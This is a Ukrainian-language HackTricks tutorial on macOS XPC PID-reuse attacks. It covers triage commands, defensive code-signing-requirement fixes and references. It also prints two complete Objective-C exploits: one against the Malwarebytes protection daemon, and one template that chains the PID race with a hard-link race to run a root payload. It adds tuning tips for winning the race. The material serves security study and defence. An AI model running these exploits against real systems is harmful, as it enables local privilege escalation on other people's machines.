# Повторне використання PID

{{#include ../../../../../../banners/hacktricks-training.md}}

## Повторне використання PID

Коли **XPC service** у macOS автентифікує викликача, визначаючи його **PID**, замість використання облікових даних, прив’язаних до отриманого повідомлення, він може бути вразливим до атаки повторного використання PID. Практична примітива полягає не в очікуванні переповнення простору імен PID: attacker надсилає XPC-запит і негайно викликає **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** з `POSIX_SPAWN_SETEXEC`, замінюючи образ процесу attacker на **дозволений binary зі збереженням PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Якщо сервер витягує запит із черги, а вже потім визначає цей числовий PID як активний процес для перевірки code-signing, entitlement, шляху або батьківського процесу, він бачить binary-заміник, а не процес, який надіслав повідомлення. `POSIX_SPAWN_START_SUSPENDED` підтримує довірений процес-заміник активним і стабільним, поки сервер виконує перевірку.<sup>[[1]](#references)[[2]](#references)</sup>

### Що насправді є об’єктом гонки

Вразлива послідовність є **TOCTOU ідентичності повідомлення**, а не просто ситуацією, коли «PIDs можуть повторюватися»:<sup>[[1]](#references)[[2]](#references)</sup>

1. Процес attacker встановлює або відновлює XPC-з’єднання та ставить привілейований запит у чергу.
2. До того як service перетворить PID з’єднання на `SecCodeRef` або інший об’єкт процесу, attacker накладає на той самий процес approved executable, використовуючи `POSIX_SPAWN_SETEXEC`.
3. Service перевіряє approved image, яка наразі прив’язана до цього PID, а потім обробляє вже поставлений у чергу запит, контрольований attacker.

Будь-який PID bridge у потоці авторизації є підозрілим: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` або `audit_token_to_pid`, після яких викликаються `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` або custom signature verifier. PID, який використовується лише для logging, недостатній; потрібно підтвердити, що він впливає на рішення allow/deny. Також перевіряйте шляхи обробки помилок: спроба спочатку виконати пошук за audit-token, але **перехід до PID у разі помилки** відновлює ту саму гонку. Цей fallback pattern з’явився в аналізі привілейованих XPC services Intego у 2026 році.<sup>[[3]](#references)</sup>

### Швидкий static і dynamic triage

Почніть з обробника з’єднання та простежте кожен виклик, що повертає PID, до перевірок code-signing, entitlement, шляху до executable або версії. Ці команди забезпечують швидку первинну перевірку candidate helper; навіть stripped binaries зазвичай містять imported symbols, Objective-C selectors або diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Під час контрольованого тесту зламайте або встановіть hook на обидва джерела PID і його verifier. Спрацювання на `xpc_connection_get_pid` або `-processIdentifier` є лише зачіпкою; корисним доказом є пізніший пошук **того самого цілого числа** після отримання запиту. Frida також може встановити hook на специфічний для застосунку verifier і привілейований selector, щоб виміряти, чи виконується selector, коли race для PID завершується успішно.<sup>[[3]](#references)</sup>

### Приклад exploit

Якщо ви знайдете функцію **`shouldAcceptNewConnection`** або викликану нею функцію, яка **викликає** **`processIdentifier`** і не викликає **`auditToken`**, це, найімовірніше, означає, що вона **перевіряє PID процесу**, а не audit token.\
Наприклад, на цьому зображенні (взято з reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Перегляньте цей приклад exploit (також узятий із reference), щоб побачити 2 частини exploit:<sup>[[1]](#references)</sup>

- Той, що **створює кілька fork**
- **Кожен fork** **надсилатиме** **payload** до XPC service, виконуючи **`posix_spawn`** одразу після надсилання повідомлення.

> [!CAUTION]
> Під час race з `fork()` з Objective-C process запустіть exploit із експортованою змінною `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` або вбудуйте маркер `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Перший варіант із використанням **`NSTasks`** і аргументу для запуску дочірніх процесів, щоб виконати exploit RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
У цьому прикладі використовується необроблений **`fork`** для запуску **дочірніх процесів, які використають стан гонитви PID**, а потім використають **інший стан гонитви через жорстке посилання:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Відтворення race

Наведені нижче параметри налаштування повторюються у робочих експлойтах із повторним використанням PID і під час нещодавнього тестування привілейованих helper:<sup>[[1]](#references)[[3]](#references)</sup>

- Надішліть запит і негайно викличте `posix_spawn`; **не** очікуйте на відповідь. Запит уже має бути поставлений у чергу, коли сервер виконує пошук PID після заміни image.
- Використовуйте разом `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`. Перший flag зберігає PID процесу, який бере участь у race; другий не дає коректній цілі завершити роботу або змінити стан до перевірки.
- Використовуйте кілька короткоживучих racer-процесів і повторюйте повну послідовність connection/request/exec. Оптимальна кількість залежить від цілі; надмірна кількість дочірніх процесів може сповільнити service і погіршити вікно.
- Заміна має відповідати **всій** вимозі сервера. За можливості повторно використовуйте легітимний client binary і спочатку перевірте його designated requirement за допомогою `codesign -d -r- "/path/to/client.app"`.
- Спочатку викличте нешкідливий exported selector або read-only method. Це дає змогу відокремити успішне проходження authentication від успішної експлуатації подальшого privileged primitive.

## Уникнення PID bridge

У macOS 13+ Foundation надає `-[NSXPCConnection setCodeSigningRequirement:]`. Встановіть вимогу до peer рівно один раз і **до** `resume`; некоректні рядки вимог спричиняють exception (або fatal error у Swift), а повідомлення від peer, який не відповідає вимозі, робить connection недійсним. Це дає змогу XPC застосовувати перевірку code identity peer без того, щоб application code визначав PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Для сучасного low-level listener API у macOS 26+, `xpc_listener_set_peer_requirement` застосовує перевірений `xpc_peer_requirement_t`, коли listener неактивний. XPC відкидає запити, які йому не відповідають; peer sessions, створені listener, не успадковують цю вимогу, тому також застосовуйте відповідну session requirement, якщо ці сесії авторизують привілейовані операції.<sup>[[7]](#references)</sup>

> [!WARNING]
> Не намагайтеся «виправити» це копіюванням audit token із подальшим перетворенням його назад на PID для фактичного пошуку `SecCode`. Зберігайте ідентичність, отриману з audit token, протягом усього процесу прийняття рішення щодо авторизації або використовуйте XPC peer-requirement API від початку до кінця.<sup>[[2]](#references)[[6]](#references)</sup> API для audit token на рівні всього connection також мають окремий клас race condition, описаний у [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Інші приклади

- [**Intego X9: Чому ваш macOS antivirus не повинен довіряти PID**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE проти привілейованого helper AV, який автентифікував клієнтів за PID.<sup>[[3]](#references)</sup>
- [**Exploiting GOG Galaxy XPC service for privilege escalation in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Частина II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Вивчення XPC exploitation — Частина 2: Скажіть «ні» PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Не довіряйте PID! Історії простої логічної помилки та місця, де її шукати — Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Чому ваш macOS antivirus не повинен довіряти PID](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Exploiting GOG Galaxy XPC service for privilege escalation in macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Частина II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
